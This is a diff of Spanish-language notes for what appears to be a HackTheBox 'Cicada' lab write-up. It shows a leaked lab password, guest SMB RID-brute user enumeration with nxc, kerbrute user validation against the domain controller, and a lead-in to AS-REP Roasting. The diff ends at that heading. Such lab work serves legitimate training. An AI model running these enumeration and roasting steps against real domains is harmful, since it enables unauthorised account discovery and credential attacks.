@@ -124,21 +124,22 @@ El archivo nos indica que la contraseña es `Cicada$M6Corpb*@Lp#nZp!8`, pero en 
 
 ### Enumeración de usuarios
 Usaremos [[CRACKMAPEXEC]]  para enumerar los usuarios usando los parámetros
-- `--shares` para enumerar recursos compartidos
 - `-u` para pasar un usuario
 - `-p` para pasar una password
-- `--rid-brute` 
-
-
-### SMB (139, 445)
-Este comando nos permite enumerar usuarios validos
-`nxc smb 10.129.231.149 --shares -u 'guest' -p '' --rid-brute`
+- `--rid-brute` para enumerar los usuarios validos
+```shell
+nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
+```
 
 Para quedarnos solo con los usuarios que nos interesan usaremos la siguiente expresión regular
-`nxc smb 10.129.231.149 --shares -u 'guest' -p '' --rid-brute | grep "SidTypeUser"`
+```shell
+nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
+```
 
 Nos los copiamos, guardamos en un archivo y utilizamos la siguiente expresión regular para obtener solo los nombres
-`cat users| awk '{print $2}' | tr '\\' ' ' | awk 'NF{print $NF}'
+```shell
+cat users| awk '{print $2}' | tr '\\' ' ' | awk 'NF{print $NF}'
+```
 
 Hemos obtenido la siguiente lista de usuarios
 ```txt
@@ -154,12 +155,16 @@ emily.oscars
 ```
 
 ## Verificar usuarios validos
-Para verificar si los usuarios son validos ejecutaremos
-`kerbrute userenum  --dc 10.129.231.149 -d cicada.htb users`
+Para verificar si los usuarios son validos ejecutaremos [[KERBRUTE]] con el parametro
+- `userenum` para enumerar usuarios
+- `--dc` para indicar la IP de la maquina victima
+- `-d` para indicar el dominio
+- Y al final le pasamos la lista con los usuarios
+```shell
+kerbrute userenum  --dc 10.129.231.149 -d cicada.htb users
+```
 
-Nos devuelve que los usuarios son validos
-
-Probaremos con este listado potencial de usuarios ver si son susceptibles al ataque  [[#AS-REP Roasting Attack]]
+Nos devuelve que los usuarios son validos probaremos con este listado potencial de usuarios ver si son susceptibles al ataque  [[#AS-REP Roasting Attack]]
 ## AS-REP Roasting Attack
 
 Para ver si son susceptibles los usuarios a este ataque 
